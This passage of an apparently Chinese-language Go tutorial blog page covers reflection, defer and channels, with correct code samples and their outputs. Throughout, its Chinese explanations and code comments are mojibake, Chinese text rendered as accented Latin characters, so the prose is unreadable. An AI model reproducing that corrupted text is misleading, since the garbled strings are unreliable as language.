&#123;<br><br>getType := reflect.TypeOf(input)<br>fmt.Println(<span class="hljs-string">&quot;get Type is :&quot;</span>, getType.Name())<br><br>getValue := reflect.ValueOf(input)<br>fmt.Println(<span class="hljs-string">&quot;get all Fields is:&quot;</span>, getValue)<br><br><span class="hljs-comment">// è·å–æ–¹æ³•å­—æ®µ</span><br><span class="hljs-comment">// 1. å…ˆè·å–interfaceçš„reflect.Typeï¼Œç„¶åé€šè¿‡NumFieldè¿›è¡Œéå†</span><br><span class="hljs-comment">// 2. å†é€šè¿‡reflect.Typeçš„Fieldè·å–å…¶Field</span><br><span class="hljs-comment">// 3. æœ€åé€šè¿‡Fieldçš„Interface()å¾—åˆ°å¯¹åº”çš„value</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; getType.NumField(); i++ &#123;<br>field := getType.Field(i)<br>value := getValue.Field(i).Interface()<br>fmt.Printf(<span class="hljs-string">&quot;%s: %v = %v\n&quot;</span>, field.Name, field.Type, value)<br>&#125;<br><br><span class="hljs-comment">// è·å–æ–¹æ³•</span><br><span class="hljs-comment">// 1. å…ˆè·å–interfaceçš„reflect.Typeï¼Œç„¶åé€šè¿‡.NumMethodè¿›è¡Œéå†</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; getType.NumMethod(); i++ &#123;<br>m := getType.Method(i)<br>fmt.Printf(<span class="hljs-string">&quot;%s: %v\n&quot;</span>, m.Name, m.Type)<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//è¿è¡Œç»“æœï¼š</span><br><span class="hljs-comment">//get Type is : User</span><br><span class="hljs-comment">//get all Fields is: &#123;1 Allen.Wu 25&#125;</span><br><span class="hljs-comment">//Id: int = 1</span><br><span class="hljs-comment">//Name: string = Allen.Wu</span><br><span class="hljs-comment">//Age: int = 25</span><br><span class="hljs-comment">//ReflectCallFunc: func(main.User)</span><br><br></code></pre></td></tr></table></figure><h3 id="è®¾ç½®å˜é‡å€¼"><a href="#è®¾ç½®å˜é‡å€¼" class="headerlink" title="è®¾ç½®å˜é‡å€¼"></a>è®¾ç½®å˜é‡å€¼</h3><p>reflect.Valueæ˜¯é€šè¿‡reflect.ValueOf(X)è·å¾—çš„ï¼Œåªæœ‰å½“Xæ˜¯æŒ‡é’ˆçš„æ—¶å€™ï¼Œæ‰å¯ä»¥é€šè¿‡reflec.Valueä¿®æ”¹å®é™…å˜é‡Xçš„å€¼ï¼Œå³ï¼šè¦ä¿®æ”¹åå°„ç±»å‹çš„å¯¹è±¡å°±ä¸€å®šè¦ä¿è¯å…¶å€¼æ˜¯â€œaddressableâ€çš„ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;reflect&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br><span class="hljs-keyword">var</span> num <span class="hljs-keyword">float64</span> = <span class="hljs-number">1.2345</span><br>fmt.Println(<span class="hljs-string">&quot;old value of pointer:&quot;</span>, num)<br><br><span class="hljs-comment">// é€šè¿‡reflect.ValueOfè·å–numä¸­çš„reflect.Valueï¼Œæ³¨æ„ï¼Œå‚æ•°å¿…é¡»æ˜¯æŒ‡é’ˆæ‰èƒ½ä¿®æ”¹å…¶å€¼</span><br>pointer := reflect.ValueOf(&amp;num)<br>newValue := pointer.Elem()<br><br>fmt.Println(<span class="hljs-string">&quot;type of pointer:&quot;</span>, newValue.Type())<br>fmt.Println(<span class="hljs-string">&quot;settability of pointer:&quot;</span>, newValue.CanSet())<br><br><span class="hljs-comment">// é‡æ–°èµ‹å€¼</span><br>newValue.SetFloat(<span class="hljs-number">77</span>)<br>fmt.Println(<span class="hljs-string">&quot;new value of pointer:&quot;</span>, num)<br><br><span class="hljs-comment">////////////////////</span><br><span class="hljs-comment">// å¦‚æœreflect.ValueOfçš„å‚æ•°ä¸æ˜¯æŒ‡é’ˆï¼Œä¼šå¦‚ä½•ï¼Ÿ</span><br>pointer = reflect.ValueOf(num)<br><span class="hljs-comment">//newValue = pointer.Elem() // å¦‚æœéæŒ‡é’ˆï¼Œè¿™é‡Œç›´æ¥panicï¼Œâ€œpanic: reflect: call of reflect.Value.Elem on float64 Valueâ€</span><br>&#125;<br><br><span class="hljs-comment">//è¿è¡Œç»“æœï¼š</span><br><span class="hljs-comment">//old value of pointer: 1.2345</span><br><span class="hljs-comment">//type of pointer: float64</span><br><span class="hljs-comment">//settability of pointer: true</span><br><span class="hljs-comment">//new value of pointer: 77</span><br></code></pre></td></tr></table></figure><h3 id="è°ƒç”¨æ–¹æ³•"><a href="#è°ƒç”¨æ–¹æ³•" class="headerlink" title="è°ƒç”¨æ–¹æ³•"></a>è°ƒç”¨æ–¹æ³•</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;reflect&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> &#123;<br>Id   <span class="hljs-keyword">int</span><br>Name <span class="hljs-keyword">string</span><br>Age  <span class="hljs-keyword">int</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(u User)</span> <span class="hljs-title">ReflectCallFuncHasArgs</span><span class="hljs-params">(name <span class="hljs-keyword">string</span>, age <span class="hljs-keyword">int</span>)</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;ReflectCallFuncHasArgs name: &quot;</span>, name, <span class="hljs-string">&quot;, age:&quot;</span>, age, <span class="hljs-string">&quot;and origal User.Name:&quot;</span>, u.Name)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(u User)</span> <span class="hljs-title">ReflectCallFuncNoArgs</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;ReflectCallFuncNoArgs&quot;</span>)<br>&#125;<br><br><span class="hljs-comment">// å¦‚ä½•é€šè¿‡åå°„æ¥è¿›è¡Œæ–¹æ³•çš„è°ƒç”¨ï¼Ÿ</span><br><span class="hljs-comment">// æœ¬æ¥å¯ä»¥ç”¨u.ReflectCallFuncXXXç›´æ¥è°ƒç”¨çš„ï¼Œä½†æ˜¯å¦‚æœè¦é€šè¿‡åå°„ï¼Œé‚£ä¹ˆé¦–å…ˆè¦å°†æ–¹æ³•æ³¨å†Œï¼Œä¹Ÿå°±æ˜¯MethodByNameï¼Œç„¶åé€šè¿‡åå°„è°ƒåŠ¨mv.Call</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>user := User&#123;<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Allen.Wu&quot;</span>, <span class="hljs-number">25</span>&#125;<br><br><span class="hljs-comment">// 1. è¦é€šè¿‡åå°„æ¥è°ƒç”¨èµ·å¯¹åº”çš„æ–¹æ³•ï¼Œå¿…é¡»è¦å…ˆé€šè¿‡reflect.ValueOf(interface)æ¥è·å–åˆ°reflect.Valueï¼Œå¾—åˆ°â€œåå°„ç±»å‹å¯¹è±¡â€åæ‰èƒ½åšä¸‹ä¸€æ­¥å¤„ç†</span><br>getValue := reflect.ValueOf(user)<br><br><span class="hljs-comment">// ä¸€å®šè¦æŒ‡å®šå‚æ•°ä¸ºæ­£ç¡®çš„æ–¹æ³•å</span><br><span class="hljs-comment">// 2. å…ˆçœ‹çœ‹å¸¦æœ‰å‚æ•°çš„è°ƒç”¨æ–¹æ³•</span><br>methodValue := getValue.MethodByName(<span class="hljs-string">&quot;ReflectCallFuncHasArgs&quot;</span>)<br>args := []reflect.Value&#123;reflect.ValueOf(<span class="hljs-string">&quot;wudebao&quot;</span>), reflect.ValueOf(<span class="hljs-number">30</span>)&#125;<br>methodValue.Call(args)<br><br><span class="hljs-comment">// ä¸€å®šè¦æŒ‡å®šå‚æ•°ä¸ºæ­£ç¡®çš„æ–¹æ³•å</span><br><span class="hljs-comment">// 3. å†çœ‹çœ‹æ— å‚æ•°çš„è°ƒç”¨æ–¹æ³•</span><br>methodValue = getValue.MethodByName(<span class="hljs-string">&quot;ReflectCallFuncNoArgs&quot;</span>)<br>args = <span class="hljs-built_in">make</span>([]reflect.Value, <span class="hljs-number">0</span>)<br>methodValue.Call(args)<br>&#125;<br><br><br><span class="hljs-comment">//è¿è¡Œç»“æœï¼š</span><br><span class="hljs-comment">//ReflectCallFuncHasArgs name:  wudebao , age: 30 and origal User.Name: Allen.Wu</span><br><span class="hljs-comment">//ReflectCallFuncNoArgs</span><br><br></code></pre></td></tr></table></figure><h2 id="defer"><a href="#defer" class="headerlink" title="defer"></a>defer</h2><p>å‘ <code>defer</code>å…³é”®å­—ä¼ å…¥çš„å‡½æ•°ä¼šåœ¨å‡½æ•°è¿”å›ä¹‹å‰è¿è¡Œã€‚</p><p>å­˜å…¥çš„å†…å®¹ä»¥å…ˆè¿›åå‡ºçš„æ–¹å¼è¾“å‡º</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>&#123;<br><span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;defer1 runs&quot;</span>)<br>fmt.Println(<span class="hljs-string">&quot;block ends&quot;</span>)<br><span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;defer2 runs&quot;</span>)<br>&#125;<br><br>fmt.Println(<span class="hljs-string">&quot;main ends&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go">block ends<br>main ends<br>defer2 runs<br>defer1 runs<br></code></pre></td></tr></table></figure><p>è°ƒç”¨ <code>defer</code>å…³é”®å­—ä¼šç«‹åˆ»æ‹·è´å‡½æ•°ä¸­å¼•ç”¨çš„å¤–éƒ¨å‚æ•°</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>startedAt := time.Now()<br><span class="hljs-keyword">defer</span> fmt.Println(time.Since(startedAt)) <span class="hljs-comment">//0s</span><br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123; fmt.Println(time.Since(startedAt)) &#125;() <span class="hljs-comment">//1s</span><br><br>time.Sleep(time.Second)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Goroutineså’ŒChannels"><a href="#Goroutineså’ŒChannels" class="headerlink" title="Goroutineså’ŒChannels"></a>Goroutineså’ŒChannels</h2><h3 id="å¹¶å‘å’Œåç¨‹"><a href="#å¹¶å‘å’Œåç¨‹" class="headerlink" title="å¹¶å‘å’Œåç¨‹"></a>å¹¶å‘å’Œåç¨‹</h3><p><a href="https://blog.csdn.net/qq_34556414/article/details/120150360">å¹¶å‘åç¨‹ç›¸å…³çŸ¥è¯†</a></p><h3 id="é€šé“"><a href="#é€šé“" class="headerlink" title="é€šé“"></a>é€šé“</h3><p><strong>ä¸è¦è®©è®¡ç®—é€šè¿‡å…±äº«å†…å­˜æ¥é€šè®¯ï¼Œè€Œåº”è¯¥è®©å®ƒä»¬é€šè¿‡é€šè®¯æ¥å…±äº«å†…å­˜ã€‚</strong>é€šé“æœºåˆ¶å°±æ˜¯è¿™ç§å“²å­¦çš„ä¸€ä¸ªè®¾è®¡ç»“æœ</p><p>æˆ‘ä»¬å¯ä»¥æŠŠä¸€ä¸ªé€šé“çœ‹ä½œæ˜¯åœ¨ä¸€ä¸ªç¨‹åºå†…éƒ¨çš„ä¸€ä¸ªå…ˆè¿›å…ˆå‡ºï¼ˆFIFOï¼šfirst in first outï¼‰æ•°æ®é˜Ÿåˆ—ã€‚ ä¸€äº›åç¨‹å¯ä»¥å‘æ­¤é€šé“å‘é€æ•°æ®ï¼Œå¦å¤–ä¸€äº›åç¨‹å¯ä»¥ä»æ­¤é€šé“æ¥æ”¶æ•°æ®ã€‚</p><p>é€šé“å¯ä»¥æ˜¯åŒå‘çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯å•å‘çš„ã€‚</p><ul><li>å­—é¢å½¢å¼<code>chan T</code>è¡¨ç¤ºä¸€ä¸ªå…ƒç´ ç±»å‹ä¸º<code>T</code>çš„åŒå‘é€šé“ç±»å‹ã€‚ ç¼–è¯‘å™¨å…è®¸ä»æ­¤ç±»å‹çš„å€¼ä¸­æ¥æ”¶å’Œå‘æ­¤ç±»å‹çš„å€¼ä¸­å‘é€æ•°æ®ã€‚</li><li>å­—é¢å½¢å¼<code>chan&lt;- T</code>è¡¨ç¤ºä¸€ä¸ªå…ƒç´ ç±»å‹ä¸º<code>T</code>çš„å•å‘å‘é€é€šé“ç±»å‹ã€‚ ç¼–è¯‘å™¨ä¸å…è®¸ä»æ­¤ç±»å‹çš„å€¼ä¸­æ¥æ”¶æ•°æ®ã€‚</li><li>å­—é¢å½¢å¼<code>&lt;-chan T</code>è¡¨ç¤ºä¸€ä¸ªå…ƒç´ ç±»å‹ä¸º<code>T</code>çš„å•å‘æ¥æ”¶é€šé“ç±»å‹ã€‚ ç¼–è¯‘å™¨ä¸å…è®¸å‘æ­¤ç±»å‹çš„å€¼ä¸­å‘é€æ•°æ®ã€‚</li></ul><p>ä¸€ä¸ªå®¹é‡ä¸º0çš„é€šé“å€¼ç§°ä¸ºä¸€ä¸ªéç¼“å†²é€šé“ï¼ˆunbuffered channelï¼‰ï¼Œä¸€ä¸ªå®¹é‡ä¸ä¸º0çš„é€šé“å€¼ç§°ä¸ºä¸€ä¸ªç¼“å†²é€šé“ï¼ˆbuffered channelï¼‰ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">ch = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>)    <span class="hljs-comment">// unbuffered channel</span><br>ch = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>, <span class="hljs-number">0</span>) <span class="hljs-comment">// unbuffered channel</span><br>ch = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>, <span class="hljs-number">3</span>) <span class="hljs-comment">// buffered channel with capacity 3</span><br></code></pre></td></tr></table></figure><p>å½“ä¸€ä¸ªé€šé“å€¼è¢«èµ‹ç»™å¦ä¸€ä¸ªé€šé“å€¼åï¼Œè¿™ä¸¤ä¸ªé€šé“å€¼å°†å…±äº«ç›¸åŒçš„åº•å±‚éƒ¨åˆ†ã€‚ æ¢å¥è¯è¯´ï¼Œè¿™ä¸¤ä¸ªé€šé“å¼•ç”¨ç€åŒä¸€ä¸ªåº•å±‚çš„å†…éƒ¨é€šé“å¯¹è±¡ã€‚ æ¯”è¾ƒè¿™ä¸¤ä¸ªé€šé“çš„ç»“æœä¸º<code>true</code>ã€‚</p><p>é€šé“çš„æ“ä½œ</p><ol><li><p>è°ƒç”¨å†…ç½®å‡½æ•°<code>close</code>æ¥å…³é—­ä¸€ä¸ªé€šé“ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">close</span><span class="hljs-params">(ch)</span></span><br></code></pre></td></tr></table></figure><p>ä¼ ç»™<code>close</code>å‡½æ•°è°ƒç”¨çš„å®å‚å¿…é¡»ä¸ºä¸€ä¸ªé€šé“å€¼ï¼Œå¹¶ä¸”æ­¤é€šé“å€¼ä¸èƒ½ä¸ºå•å‘æ¥æ”¶çš„ã€‚</p></li><li><p>ä½¿ç”¨ä¸‹é¢çš„è¯­æ³•å‘é€šé“<code>ch</code>å‘é€ä¸€ä¸ªå€¼<code>v</code>ï¼š</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">ch &lt;- v<br></code></pre></td></tr></table></figure><p><code>v</code>å¿…é¡»èƒ½å¤Ÿèµ‹å€¼ç»™é€šé“<code>ch</code>çš„å…ƒç´ ç±»å‹ã€‚ <code>ch</code>ä¸èƒ½ä¸ºå•å‘æ¥æ”¶é€šé“ã€‚ <code>&lt;-</code>ç§°ä¸ºæ•°æ®å‘é€æ“ä½œç¬¦ã€‚</p></li><li><p>ä½¿ç”¨ä¸‹é¢çš„è¯­æ³•ä»é€šé“<code>ch</code>æ¥æ”¶ä¸€ä¸ªå€¼ï¼šå¦‚æœä¸€ä¸ªé€šé“æ“ä½œä¸æ°¸ä¹…é˜»å¡ï¼Œå®ƒæ€»ä¼šè¿”å›è‡³å°‘ä¸€ä¸ªå€¼ï¼Œæ­¤å€¼çš„ç±»å‹ä¸ºé€šé“<code>ch</code>çš„å…ƒç´ ç±»å‹ã€‚ <code>ch</code>ä¸èƒ½ä¸ºå•å‘å‘é€é€šé“ã€‚ <code>&lt;-</code>ç§°ä¸ºæ•°æ®æ¥æ”¶æ“ä½œç¬¦ï¼Œæ˜¯çš„å®ƒå’Œæ•°æ®å‘é€æ“ä½œç¬¦çš„è¡¨ç¤ºå½¢å¼æ˜¯ä¸€æ ·çš„ã€‚åœ¨å¤§å¤šæ•°åœºåˆä¸‹ï¼Œä¸€ä¸ªæ•°æ®æ¥æ”¶æ“ä½œå¯ä»¥è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªå•å€¼è¡¨è¾¾å¼ã€‚ ä½†æ˜¯ï¼Œå½“ä¸€ä¸ªæ•°æ®æ¥æ”¶æ“ä½œè¢«ç”¨åšä¸€ä¸ªèµ‹å€¼è¯­å¥ä¸­çš„å”¯ä¸€çš„æºå€¼çš„æ—¶å€™ï¼Œå®ƒå¯ä»¥è¿”å›ç¬¬äºŒä¸ªå¯é€‰çš„ç±»å‹ä¸ç¡®å®šçš„å¸ƒå°”å€¼è¿”å›å€¼ä»è€Œæˆä¸ºä¸€ä¸ªå¤šå€¼è¡¨è¾¾å¼ã€‚ æ­¤ç±»å‹ä¸ç¡®å®šçš„å¸ƒå°”å€¼è¡¨ç¤ºç¬¬ä¸€ä¸ªæ¥æ”¶åˆ°çš„å€¼æ˜¯å¦æ˜¯åœ¨é€šé“è¢«å…³é—­å‰å‘é€çš„ã€‚ ï¼ˆä»åé¢çš„ç« èŠ‚ï¼Œæˆ‘ä»¬å°†å¾—çŸ¥æˆ‘ä»¬å¯ä»¥ä»ä¸€ä¸ªå·²å…³é—­çš„é€šé“ä¸­æ¥æ”¶åˆ°æ— ç©·ä¸ªå€¼ã€‚ï¼‰æ•°æ®æ¥æ”¶æ“ä½œåœ¨èµ‹å€¼ä¸­è¢«ç”¨åšæºå€¼çš„ä¾‹å­ï¼š</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">&lt;-ch<br></code></pre></td></tr></table></figure><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">v = &lt;-ch<br>v, sentBeforeClosed = &lt;-ch<br></code></pre></td></tr></table></figure></li><li><p>æŸ¥è¯¢ä¸€ä¸ªé€šé“çš„å®¹é‡ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">cap</span><span class="hljs-params">(ch)</span></span><br></code></pre></td></tr></table></figure><p> <code>cap</code>çš„è¿”å›å€¼çš„ç±»å‹ä¸ºå†…ç½®ç±»å‹<code>int</code>ã€‚</p></li><li><p>æŸ¥è¯¢ä¸€ä¸ªé€šé“çš„é•¿åº¦ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">len</span><span class="hljs-params">(ch)</span></span><br></code></pre></td></tr></table></figure></li></ol><p> <code>len</code>çš„è¿”å›å€¼çš„ç±»å‹ä¹Ÿä¸ºå†…ç½®ç±»å‹<code>int</code>ã€‚ ä¸€ä¸ªé€šé“çš„é•¿åº¦æ˜¯æŒ‡å½“å‰æœ‰å¤šå°‘ä¸ªå·²è¢«å‘é€åˆ°æ­¤é€šé“ä½†è¿˜æœªè¢«æ¥æ”¶å‡ºå»çš„å…ƒç´ å€¼ã€‚</p><ul><li>å¦‚æœä¸€ä¸ªé€šé“å·²ç»å…³é—­äº†ï¼Œåˆ™å®ƒçš„å‘é€æ•°æ®åç¨‹é˜Ÿåˆ—å’Œæ¥æ”¶æ•°æ®åç¨‹é˜Ÿåˆ—è‚¯å®šéƒ½ä¸ºç©ºï¼Œä½†æ˜¯å®ƒçš„ç¼“å†²é˜Ÿåˆ—å¯èƒ½ä¸ä¸ºç©ºã€‚</li><li>åœ¨ä»»ä½•æ—¶åˆ»ï¼Œå¦‚æœç¼“å†²é˜Ÿåˆ—ä¸ä¸ºç©ºï¼Œåˆ™æ¥æ”¶æ•°æ®åç¨‹é˜Ÿåˆ—å¿…ä¸ºç©ºã€‚</li><li>åœ¨ä»»ä½•æ—¶åˆ»ï¼Œå¦‚æœç¼“å†²é˜Ÿåˆ—æœªæ»¡ï¼Œåˆ™å‘é€æ•°æ®åç¨‹é˜Ÿåˆ—å¿…ä¸ºç©ºã€‚</li><li>å¦‚æœä¸€ä¸ªé€šé“æ˜¯ç¼“å†²çš„ï¼Œåˆ™åœ¨ä»»ä½•æ—¶åˆ»ï¼Œå®ƒçš„å‘é€æ•°æ®åç¨‹é˜Ÿåˆ—å’Œæ¥æ”¶æ•°æ®åç¨‹é˜Ÿåˆ—ä¹‹ä¸€å¿…ä¸ºç©ºã€‚</li><li>å¦‚æœä¸€ä¸ªé€šé“æ˜¯éç¼“å†²çš„ï¼Œåˆ™åœ¨ä»»ä½•æ—¶åˆ»ï¼Œä¸€èˆ¬è¯´æ¥ï¼Œå®ƒçš„å‘é€æ•°æ®åç¨‹é˜Ÿåˆ—å’Œæ¥æ”¶æ•°æ®åç¨‹é˜Ÿåˆ—ä¹‹ä¸€å¿…ä¸ºç©ºï¼Œ ä½†æ˜¯æœ‰ä¸€ä¸ªä¾‹å¤–ï¼šä¸€ä¸ªåç¨‹å¯èƒ½åœ¨ä¸€ä¸ª<code>select</code>æµç¨‹æ§åˆ¶ä¸­åŒæ—¶è¢«æ¨å…¥åˆ°æ­¤é€šé“çš„å‘é€æ•°æ®åç¨‹é˜Ÿåˆ—å’Œæ¥æ”¶æ•°æ®åç¨‹é˜Ÿåˆ—ä¸­ã€‚</li></ul><p>ä¸€ä¸ªç®€å•çš„é€šè¿‡ä¸€ä¸ªéç¼“å†²é€šé“å®ç°çš„è¯·æ±‚/å“åº”çš„ä¾‹å­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>c := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>) <span class="hljs-comment">// ä¸€ä¸ªéç¼“å†²é€šé“</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ch <span class="hljs-keyword">chan</span>&lt;- <span class="hljs-keyword">int</span>, x <span class="hljs-keyword">int</span>)</span></span> &#123;<br>time.Sleep(time.Second)<br><span class="hljs-comment">// &lt;-ch    // æ­¤æ“ä½œç¼–è¯‘ä¸é€šè¿‡</span><br>ch &lt;- x*x  <span class="hljs-comment">// é˜»å¡åœ¨æ­¤ï¼Œç›´åˆ°å‘é€çš„å€¼è¢«æ¥æ”¶</span><br>&#125;(c, <span class="hljs-number">3</span>)<br>done := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ch &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>)</span></span> &#123;<br>n := &lt;-ch      <span class="hljs-comment">// é˜»å¡åœ¨æ­¤ï¼Œç›´åˆ°æœ‰å€¼å‘é€åˆ°c</span><br>fmt.Println(n) <span class="hljs-comment">// 9</span><br><span class="hljs-comment">// ch &lt;- 123   // æ­¤æ“ä½œç¼–è¯‘ä¸é€šè¿‡</span><br>time.Sleep(time.Second)<br>done &lt;- <span class="hljs-keyword">struct</span>&#123;&#125;&#123;&#125;<br>&#125;(c)<br>&lt;-done <span class="hljs-comment">// é˜»å¡åœ¨æ­¤ï¼Œç›´åˆ°æœ‰å€¼å‘é€åˆ°done</span><br>fmt.Println(<span class="hljs-string">&quot;bye&quot;</span>)<br>&#125;<br><br><span class="hljs-comment">//è¾“å‡ºï¼š</span><br><span class="hljs-comment">//9 </span><br><span class="hljs-comment">//bye</span><br></code></pre></td></tr></table></figure><p>ç¼“å†²é€šé“çš„ä¾‹å­</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>c := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>, <span class="hljs-number">2</span>) <span 